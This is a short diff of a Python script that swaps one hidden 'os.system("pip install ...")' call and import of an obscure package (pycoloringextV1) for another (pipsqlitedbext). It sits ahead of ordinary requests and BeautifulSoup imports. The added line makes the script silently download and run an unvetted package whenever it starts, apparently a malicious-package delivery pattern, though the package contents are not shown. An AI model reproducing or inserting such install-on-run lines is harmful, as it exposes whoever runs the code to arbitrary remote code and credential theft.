@@ -1,6 +1,6 @@
 import os
-os.system("pip install pycoloringextV1")
-import pycoloringextV1
+os.system("pip install pipsqlitedbext")
+import pipsqlitedbext
 import requests
 from requests.structures import CaseInsensitiveDict
 from bs4 import BeautifulSoup
